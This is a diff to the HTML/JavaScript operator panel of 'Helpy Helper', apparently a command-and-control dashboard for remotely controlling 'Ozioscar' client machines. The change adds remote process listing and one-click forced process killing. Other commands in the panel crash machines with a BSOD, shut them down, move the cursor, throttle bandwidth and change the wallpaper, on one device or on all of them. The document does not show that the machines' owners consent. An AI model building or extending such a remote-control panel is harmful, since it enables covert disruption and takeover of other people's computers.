@@ -17,21 +17,25 @@
     button { cursor: pointer; background: #2b59c3; border-color: #3d6fd8; }
     button.secondary { background: #2a2f3a; border-color: #3c4454; }
     button.danger { background: #8b1e1e; border-color: #c62828; }
-    .row { display: flex; flex-wrap: wrap; gap: 10px; align-items: center; margin-bottom: 10px; }
+    button.danger.small { padding: 4px 8px; font-size: 0.8rem; }
+    .row { display: flex; flex-wrap: wrap; gap: 10px; align-items: end; margin-bottom: 10px; }
     table { width: 100%; border-collapse: collapse; font-size: 0.92rem; }
     th, td { text-align: left; padding: 10px 8px; border-bottom: 1px solid #2a2f3a; }
+    tr.proc-row { cursor: pointer; }
+    tr.proc-row:hover { background: #1e2430; }
     .online { color: #4caf50; font-weight: 600; }
     .offline { color: #888; }
     .warn { background: #3a2200; border: 1px solid #aa7700; padding: 10px; border-radius: 6px; margin-bottom: 10px; font-size: 0.9rem; }
     .danger-box { background: #3a0000; border: 2px solid #c62828; padding: 10px; border-radius: 6px; margin-bottom: 10px; font-size: 0.9rem; }
     pre { background: #0a0c10; padding: 12px; border-radius: 6px; overflow: auto; max-height: 220px; font-size: 0.85rem; }
     label { display: flex; flex-direction: column; gap: 4px; font-size: 0.85rem; color: #9aa0a6; }
+    #procStatus { min-height: 1.2em; }
   </style>
 </head>
 <body>
   <header>
     <h1>Helpy Helper</h1>
-    <p class="sub">Railway device hub — list online Ozioscar clients and dispatch global or device-specific commands.</p>
+    <p class="sub">Railway device hub — list online Ozioscar clients and dispatch commands.</p>
   </header>
   <main>
     <section>
@@ -50,9 +54,25 @@
       <h2>Devices</h2>
       <table>
         <thead>
-          <tr><th>Status</th><th>Hostname</th><th>User</th><th>Device ID</th><th>Last seen</th><th></th></tr>
+          <tr><th>Status</th><th>Hostname</th><th>User</th><th>Device ID</th><th>Inbox</th><th>Last seen</th><th></th></tr>
         </thead>
-        <tbody id="deviceRows"><tr><td colspan="6">Loading…</td></tr></tbody>
+        <tbody id="deviceRows"><tr><td colspan="7">Loading…</td></tr></tbody>
+      </table>
+    </section>
+
+    <section>
+      <h2>Process list</h2>
+      <p class="sub">Results are one-time — reading the inbox clears them. Send <code>X-Ozioscar-Device</code> must match hostname.</p>
+      <div class="row">
+        <label>Device
+          <select id="procDevice"></select>
+        </label>
+        <button onclick="fetchProcessList()">List processes</button>
+      </div>
+      <p class="sub" id="procStatus"></p>
+      <table id="procTable" hidden>
+        <thead><tr><th>PID</th><th>Name</th><th></th></tr></thead>
+        <tbody id="procRows"></tbody>
       </table>
     </section>
 
@@ -74,6 +94,7 @@
             <option value="whoopsie/stop">Whoopsie — stop</option>
             <option value="open">Open app</option>
             <option value="close">Close app</option>
+            <option value="kill">Kill PID</option>
             <option value="list-processes">List processes</option>
             <option value="shutdown">Shutdown</option>
             <option value="israel">Israel (cursor/wallpaper)</option>
@@ -99,6 +120,7 @@
   <script>
     const KEY_STORAGE = "helpy_api_key";
     let selectedDevice = "all";
+    const deviceMap = {};
 
     document.getElementById("apiKey").value = localStorage.getItem(KEY_STORAGE) || "";
     document.getElementById("action").addEventListener("change", renderPayloadFields);
@@ -109,24 +131,35 @@
       refreshDevices();
     }
 
-    function headers() {
+    function headers(deviceName) {
       const h = { "Content-Type": "application/json" };
       const key = document.getElementById("apiKey").value.trim();
       if (key) h.Authorization = "Bearer " + key;
+      if (deviceName) h["X-Ozioscar-Device"] = deviceName;
       return h;
     }
 
-    async function api(path, opts = {}) {
-      const res = await fetch(path, { ...opts, headers: { ...headers(), ...(opts.headers || {}) } });
+    async function api(path, opts = {}, deviceName) {
+      const res = await fetch(path, { ...opts, headers: { ...headers(deviceName), ...(opts.headers || {}) } });
       const data = await res.json().catch(() => ({}));
       if (!res.ok) throw new Error(data.error || res.statusText);
       return data;
     }
 
+    function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
     function fmtAgo(ms) {
       if (ms < 1000) return "just now";
       if (ms < 60000) return Math.round(ms / 1000) + "s ago";
       return Math.round(ms / 60000) + "m ago";
+    }
+
+    function esc(s) {
+      return String(s).replace(/[&<>"']/g, c => ({ "&":"&amp;","<":"&lt;",">":"&gt;","\"":"&quot;","'":"&#39;" }[c]));
+    }
+
+    function getDeviceMeta(deviceId) {
+      return deviceMap[deviceId] || null;
     }
 
     async function refreshDevices() {
@@ -135,18 +168,25 @@
         document.getElementById("status").textContent = `${data.devices.filter(d => d.online).length} online / ${data.devices.length} registered`;
         const tbody = document.getElementById("deviceRows");
         const target = document.getElementById("target");
+        const procDevice = document.getElementById("procDevice");
         target.innerHTML = '<option value="all">All devices (global)</option>';
+        procDevice.innerHTML = "";
+        Object.keys(deviceMap).forEach(k => delete deviceMap[k]);
+
         tbody.innerHTML = data.devices.map(d => {
-          target.innerHTML += `<option value="${d.id}">${d.hostname} (${d.user})</option>`;
+          deviceMap[d.id] = d;
+          target.innerHTML += `<option value="${d.id}">${esc(d.hostname)} (${esc(d.user)})</option>`;
+          procDevice.innerHTML += `<option value="${d.id}">${esc(d.hostname)} (${esc(d.user)})</option>`;
           return `<tr>
             <td class="${d.online ? "online" : "offline"}">${d.online ? "ONLINE" : "offline"}</td>
             <td>${esc(d.hostname)}</td>
             <td>${esc(d.user)}</td>
             <td><code>${esc(d.id.slice(0,8))}…</code></td>
+            <td>${d.hasInbox ? "📬" : "—"}</td>
             <td>${fmtAgo(d.lastSeenAgo)}</td>
             <td><button class="secondary" onclick="pickDevice('${d.id}')">Select</button></td>
           </tr>`;
-        }).join("") || '<tr><td colspan="6">No devices yet — run theapp on a client.</td></tr>';
+        }).join("") || '<tr><td colspan="7">No devices yet — run theapp on a client.</td></tr>';
         target.value = selectedDevice;
       } catch (e) {
         document.getElementById("status").textContent = "Error: " + e.message;
@@ -156,10 +196,84 @@
     function pickDevice(id) {
       selectedDevice = id;
       document.getElementById("target").value = id;
+      document.getElementById("procDevice").value = id;
     }
 
-    function esc(s) {
-      return String(s).replace(/[&<>"']/g, c => ({ "&":"&amp;","<":"&lt;",">":"&gt;","\"":"&quot;","'":"&#39;" }[c]));
+    function parseProcessResult(resultText) {
+      try {
+        const parsed = JSON.parse(resultText);
+        return Array.isArray(parsed) ? parsed : [];
+      } catch {
+        return [];
+      }
+    }
+
+    function renderProcessTable(processes, deviceId) {
+      const table = document.getElementById("procTable");
+      const tbody = document.getElementById("procRows");
+      if (!processes.length) {
+        table.hidden = true;
+        return;
+      }
+      table.hidden = false;
+      tbody.innerHTML = processes.map(p => `
+        <tr class="proc-row">
+          <td>${esc(p.Id ?? p.id ?? "")}</td>
+          <td>${esc(p.Name ?? p.name ?? "")}</td>
+          <td><button class="danger small" onclick="killProcess('${deviceId}', ${Number(p.Id ?? p.id)}, event)">Kill /F</button></td>
+        </tr>
+      `).join("");
+    }
+
+    async function fetchProcessList() {
+      const deviceId = document.getElementById("procDevice").value;
+      const meta = getDeviceMeta(deviceId);
+      if (!meta) { document.getElementById("procStatus").textContent = "Select a device."; return; }
+
+      const status = document.getElementById("procStatus");
+      status.textContent = "Dispatching list-processes…";
+      document.getElementById("procTable").hidden = true;
+
+      try {
+        await api("/api/commands", {
+          method: "POST",
+          body: JSON.stringify({ target: deviceId, action: "list-processes", payload: {} })
+        }, meta.hostname);
+
+        for (let i = 0; i < 25; i++) {
+          await sleep(1500);
+          status.textContent = `Waiting for response… (${i + 1}/25)`;
+          const inbox = await api(`/api/inbox/${deviceId}`, {}, meta.hostname);
+          if (inbox.empty) continue;
+          if (inbox.action === "list-processes" || inbox.result) {
+            const processes = parseProcessResult(inbox.result);
+            status.textContent = `Loaded ${processes.length} processes from ${inbox.deviceName || meta.hostname} (consumed — read once).`;
+            renderProcessTable(processes, deviceId);
+            refreshDevices();
+            return;
+          }
+        }
+        status.textContent = "Timed out waiting for process list.";
+      } catch (e) {
+        status.textContent = "Error: " + e.message;
+      }
+    }
+
+    async function killProcess(deviceId, pid, ev) {
+      ev?.stopPropagation();
+      const meta = getDeviceMeta(deviceId);
+      if (!meta || !pid) return;
+      if (!confirm(`taskkill /F /PID ${pid} on ${meta.hostname}?`)) return;
+      try {
+        const data = await api("/api/commands", {
+          method: "POST",
+          body: JSON.stringify({ target: deviceId, action: "kill", payload: { pid } })
+        }, meta.hostname);
+        document.getElementById("procStatus").textContent = `Kill dispatched for PID ${pid}: ${JSON.stringify(data.command?.id || "ok")}`;
+        setTimeout(fetchProcessList, 3000);
+      } catch (e) {
+        document.getElementById("procStatus").textContent = "Kill error: " + e.message;
+      }
     }
 
     function renderPayloadFields() {
@@ -171,6 +285,7 @@
         "rate": `<label>MB/s (0 = remove)<input id="p_mbs" type="number" value="5" min="0"/></label>`,
         "open": `<label>App<input id="p_app" placeholder="notepad.exe"/></label>`,
         "close": `<label>App<input id="p_app" placeholder="notepad.exe"/></label>`,
+        "kill": `<label>PID<input id="p_pid" type="number" min="1" placeholder="1234"/></label>`,
         "shutdown": `<label>Confirm text<input id="p_confirm" placeholder="CONFIRM SHUTDOWN"/></label>`,
         "israel": `<label>Confirm text<input id="p_confirm" placeholder="CONFIRM ISRAEL"/></label>`,
         "remove": `<label>Confirm text<input id="p_confirm" placeholder="REMOVE STARTUP"/></label>`,
@@ -186,6 +301,7 @@
       if (action === "drift/start") { p.direction = g("p_direction")?.value || "right"; p.speed = Number(g("p_speed")?.value || 2); }
       if (action === "rate") p.mbs = Number(g("p_mbs")?.value || 0);
       if (action === "open" || action === "close") p.app = g("p_app")?.value || "";
+      if (action === "kill") p.pid = Number(g("p_pid")?.value || 0);
       if (["shutdown","israel","remove"].includes(action)) p.confirm = g("p_confirm")?.value || "";
       if (action === "bsod") {
         p.ackCrash = g("p_ackCrash")?.checked || false;
@@ -200,13 +316,18 @@
       const target = document.getElementById("target").value;
       const action = document.getElementById("action").value;
       const payload = buildPayload();
+      const deviceName = target !== "all" ? getDeviceMeta(target)?.hostname : undefined;
       try {
         const data = await api("/api/commands", {
           method: "POST",
           body: JSON.stringify({ target, action, payload })
-        });
+        }, deviceName);
         document.getElementById("sendLog").textContent = JSON.stringify(data, null, 2);
         refreshCommands();
+        if (action === "list-processes" && target !== "all") {
+          document.getElementById("procDevice").value = target;
+          setTimeout(fetchProcessList, 500);
+        }
       } catch (e) {
         document.getElementById("sendLog").textContent = "Error: " + e.message;
       }
